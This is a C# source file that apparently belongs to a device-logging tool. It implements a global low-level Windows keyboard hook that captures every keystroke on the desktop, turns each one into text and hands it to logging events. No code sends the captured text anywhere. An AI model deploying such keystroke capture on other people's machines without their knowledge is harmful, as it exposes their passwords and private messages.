using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Input;

namespace DeviceLog.Classes.Modules.Keyboard
{
    /// <summary>
    /// A class that manages a global low level keyboard hook
    /// </summary>
    internal class KeyboardHook : IDisposable
    {
        /// <summary>
        /// Installs an application-defined hook procedure into a hook chain. You would install a hook procedure to monitor the system for certain types of events. These events are associated either with a specific thread or with all threads in the same desktop as the calling thread
        /// </summary>
        /// <param name="idHook">The hook ID</param>
        /// <param name="lpfn">The callback delegate</param>
        /// <param name="hInstance">The instance of the hook</param>
        /// <param name="threadId">The thread ID of the hook</param>
        /// <returns>An integer to indicate whether the hook was successfully placed or not</returns>
        [DllImport("user32.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int SetWindowsHookEx(int idHook, CallbackDelegate lpfn, int hInstance, int threadId);

        /// <summary>
        /// Removes a hook procedure installed in a hook chain by the SetWindowsHookEx function.
        /// </summary>
        /// <param name="idHook">A handle to the hook to be removed. This parameter is a hook handle obtained by a previous call to SetWindowsHookEx</param>
        /// <returns>A boolean to indicate whether the hook was successfully removed or not</returns>
        [DllImport("user32.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern bool UnhookWindowsHookEx(int idHook);

        /// <summary>
        /// Passes the hook information to the next hook procedure in the current hook chain. A hook procedure can call this function either before or after processing the hook information
        /// </summary>
        /// <param name="idHook"></param>
        /// <param name="nCode">The hook code passed to the current hook procedure. The next hook procedure uses this code to determine how to process the hook information.</param>
        /// <param name="wParam">The wParam value passed to the current hook procedure. The meaning of this parameter depends on the type of hook associated with the current hook chain</param>
        /// <param name="lParam">The lParam value passed to the current hook procedure. The meaning of this parameter depends on the type of hook associated with the current hook chain</param>
        /// <returns>This value is returned by the next hook procedure in the chain. The current hook procedure must also return this value. The meaning of the return value depends on the hook type. For more information, see the descriptions of the individual hook procedures</returns>
        [DllImport("user32.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int CallNextHookEx(int idHook, int nCode, int wParam, ref KbdllHookStruct lParam);

        /// <summary>
        /// Translates the specified virtual-key code and keyboard state to the corresponding Unicode character or characters.
        /// </summary>
        /// <param name="wVirtKey">The virtual-key code to be translated</param>
        /// <param name="wScanCode">The hardware scan code of the key to be translated. The high-order bit of this value is set if the key is up</param>
        /// <param name="lpKeyState">A pointer to a 256-byte array that contains the current keyboard state. Each element (byte) in the array contains the state of one key. If the high-order bit of a byte is set, the key is down</param>
        /// <param name="pwszBuff">The buffer that receives the translated Unicode character or characters. However, this buffer may be returned without being null-terminated even though the variable name suggests that it is null-terminated</param>
        /// <param name="cchBuff">The size, in characters, of the buffer pointed to by the pwszBuff parameter</param>
        /// <param name="wFlags">The behavior of the function. If bit 0 is set, a menu is active. Bits 1 through 31 are reserved</param>
        /// <param name="dwhkl">The input locale identifier used to translate the specified code. This parameter can be any input locale identifier previously returned by the LoadKeyboardLayout function</param>
        /// <returns>An integer value to indicate whether the virtual-key code could be translated to their unicode counterpart</returns>
        [DllImport("user32.dll")]
        private static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);

        /// <summary>
        /// Retrieves the status of the specified virtual key. The status specifies whether the key is up, down, or toggled (on, off—alternating each time the key is pressed)
        /// </summary>
        /// <param name="nVirtKey">A virtual key. If the desired virtual key is a letter or digit (A through Z, a through z, or 0 through 9), nVirtKey must be set to the ASCII value of that character. For other keys, it must be a virtual-key code</param>
        /// <returns></returns>
        [DllImport("user32.dll")]
        private static extern short GetKeyState(int nVirtKey);

        /// <summary>
        /// Copies the status of the 256 virtual keys to the specified buffer
        /// </summary>
        /// <param name="lpKeyState">The 256-byte array that receives the status data for each virtual key</param>
        /// <returns>If the function succeeds, the return value is nonzero</returns>
        [DllImport("user32.dll", SetLastError = true)]
        private static extern int GetKeyboardState(byte[] lpKeyState);

        /// <summary>
        /// Retrieves the active input locale identifier (formerly called the keyboard layout)
        /// </summary>
        /// <param name="idThread">The identifier of the thread to query, or 0 for the current thread</param>
        /// <returns>The return value is the input locale identifier for the thread. The low word contains a Language Identifier for the input language and the high word contains a device handle to the physical layout of the keyboard</returns>
        [DllImport("user32.dll")]
        private static extern IntPtr GetKeyboardLayout(uint idThread);

        /// <summary>
        /// The declaration of a callback delegate that can be used when setting the Windows Hook
        /// </summary>
        /// <param name="code">A code the hook procedure uses to determine how to process the message</param>
        /// <param name="w">The identifier of the keyboard message</param>
        /// <param name="l">A pointer to a KbdllHookStruct structure</param>
        /// <returns></returns>
        private delegate int CallbackDelegate(int code, int w, ref KbdllHookStruct l);

        /// <summary>
        /// The declaration of a delegate that will be used to send key-press information to other objects
        /// </summary>
        /// <param name="key">The string value of the key that has been pressed</param>
        internal delegate void KeyPressedEvent(string key);

        /// <summary>
        /// Byte code for the shift key
        /// </summary>
        private const byte VkShift = 0x10;
        /// <summary>
        /// Byte code for the CAPSLOCK key
        /// </summary>
        private const byte VkCapital = 0x14;

        /// <summary>
        /// Contains information about a low-level keyboard input event
        /// </summary>
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct KbdllHookStruct
        {
            internal readonly uint vkCode;
            internal readonly uint scanCode;
            internal readonly uint flags;
            private readonly uint time;
            private readonly uint dwExtraInfo;
        }

        /// <summary>
        /// Contains information about a low-level keyboard input event
        /// </summary>
        internal enum KeyEvents
        {
            KeyDown = 0x0100,
            KeyUp = 0x0101,
            SKeyDown = 0x0104,
            SKeyUp = 0x0105
        }

        /// <summary>
        /// The current hook ID
        /// </summary>
        private int _hookId;
        /// <summary>
        /// A boolean to indicate whether or not the low-level hook has been removed
        /// </summary>
        private bool _isFinalized;
        /// <summary>
        /// The private callback degelate that will be called when the hook is placed
        /// </summary>
        // ReSharper disable once PrivateFieldCanBeConvertedToLocalVariable
        private CallbackDelegate _theHookCb;

        /// <summary>
        /// The event that will be fired when the low-level hook detects that a key was released upward
        /// </summary>
        internal KeyPressedEvent KeyUp;
        /// <summary>
        /// The event that will be fired when the low-level hook detects that a key was pressed downwards
        /// </summary>
        internal KeyPressedEvent KeyDown;

        /// <summary>
        /// A boolean to indicate whether special keys should be logged or not
        /// </summary>
        private readonly bool _logSpecialKeys;
        /// <summary>
        /// A boolean to indicate whether control keys should be logged or not
        /// </summary>
        private readonly bool _logControlKeys;

        /// <summary>
        /// Initialize a new KeyboardHook object
        /// </summary>
        /// <param name="logSpecial">A boolean to indicate whether or not special keys should be logged</param>
        /// <param name="logControl">A boolean to indicate whether or not control keys should be logged</param>
        internal KeyboardHook(bool logSpecial, bool logControl)
        {
            _logSpecialKeys = logSpecial;
            _logControlKeys = logControl;

            _isFinalized = true;
        }

        /// <summary>
        /// Create a low-level keyboard hook
        /// </summary>
        internal void Hook()
        {
            if (!_isFinalized) return;
            _theHookCb = KeybHookProc;
            _hookId = SetWindowsHookEx(13, _theHookCb, 0, 0);

            _isFinalized = false;
        }

        /// <summary>
        /// Dispose the low-level keyboard hook
        /// </summary>
        internal void Unhook()
        {
            Dispose();
        }

        /// <summary>
        /// Dispose of the low-level hook
        /// </summary>
        ~KeyboardHook()
        {
            Dispose();
        }

        /// <summary>
        /// Safely remove the low-level keyboard hook
        /// </summary>
        public void Dispose()
        {
            if (_isFinalized) return;
            UnhookWindowsHookEx(_hookId);
            _isFinalized = true;
        }

        /// <summary>
        /// The method that will be called whenever a key is pressed
        /// </summary>
        /// <param name="code">A code the hook procedure uses to determine how to process the message</param>
        /// <param name="w">The identifier of the keyboard message</param>
        /// <param name="l">A pointer to a KbdllHookStruct structure</param>
        /// <returns>An integer to indicate whether the next hook was successfully placed or not</returns>
        private int KeybHookProc(int code, int w, ref KbdllHookStruct l)
        {
            if (code < 0) return CallNextHookEx(_hookId, code, w, ref l);

            KeyEvents kEvent = (KeyEvents)w;
            Key dataKey = KeyInterop.KeyFromVirtualKey((int)l.vkCode);

            bool isDownShift = (GetKeyState(VkShift) & 0x80) == 0x80;
            bool isDownCapslock = GetKeyState(VkCapital) != 0;

            byte[] keyState = new byte[256];
            GetKeyboardState(keyState);

            StringBuilder sbString = new StringBuilder(10);

            int res = ToUnicodeEx(l.vkCode, l.scanCode, keyState, sbString, sbString.Capacity, l.flags, GetKeyboardLayout(0));

            // Key can be translated to unicode counterpart
            if (res == 1)
            {
                char key = sbString[0];

                if ((isDownCapslock || isDownShift) && char.IsLetter(key))
                {
                    key = char.ToUpper(key);
                }

                string result = key.ToString();

                if (_logControlKeys)
                {
                    if (char.IsControl(key))
                    {
                        switch (dataKey)
                        {
                            case Key.Back:
                                result = "[Back]";
                                break;
                            case Key.Escape:
                                result = "[ESC]";
                                break;
                        }
                    }
                }

                switch (kEvent)
                {
                    case KeyEvents.KeyDown:
                    case KeyEvents.SKeyDown:
                        KeyDown?.Invoke(result);
                        break;
                    case KeyEvents.KeyUp:
                    case KeyEvents.SKeyUp:
                        KeyUp?.Invoke(result);
                        break;
                }
            }
            // Key cannot be translated to unicode counterpart
            else if (res == 0)
            {
                if (!_logSpecialKeys) return CallNextHookEx(_hookId, code, w, ref l);
                // ReSharper disable once SwitchStatementMissingSomeCases
                switch (kEvent)
                {
                    case KeyEvents.KeyDown:
                    case KeyEvents.SKeyDown:
                        KeyDown?.Invoke("[" + dataKey + "]");
                        break;
                    case KeyEvents.KeyUp:
                    case KeyEvents.SKeyUp:
                        KeyUp?.Invoke("[" + dataKey + "]");
                        break;
                }
            }
            return CallNextHookEx(_hookId, code, w, ref l);
        }
    }
}